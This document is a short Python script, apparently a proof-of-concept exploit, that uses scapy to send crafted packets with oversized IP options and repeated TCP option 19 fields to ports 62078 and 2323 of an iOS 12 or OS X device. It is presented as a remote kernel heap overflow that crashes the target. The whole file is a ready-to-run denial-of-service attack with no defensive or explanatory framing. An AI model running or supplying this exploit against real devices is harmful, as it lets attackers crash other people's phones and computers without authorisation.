#!/usr/bin/env python3
try:
	from scapy.all import *
except:
	print("Install scapy: pip3 install scapy")
from contextlib import contextmanager, redirect_stdout

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

def exploit():
	print("[iOS Remote DoS Kernel Heap Overflow]")
	ip = input("Enter iOS 12 / OS X IP address: ") or 0
	if ip !=0:
		print("[*] Sending payload to "+ ip)
		for i in range(8,40):
        		with suppress_stdout():
            			send(IP(dst=ip,options=[IPOption("X"*i)])/TCP(dport=62078,options=[(19, "Y"*18),(19, "Z"*18)]))
            			send(IP(dst=ip,options=[IPOption("X"*i)])/TCP(dport=2323,options=[(19, "Y"*18),(19, "Z"*18)]))

if __name__ == '__main__':
	exploit()
	print('\nCoded by NotEth1calHack3r ;)')
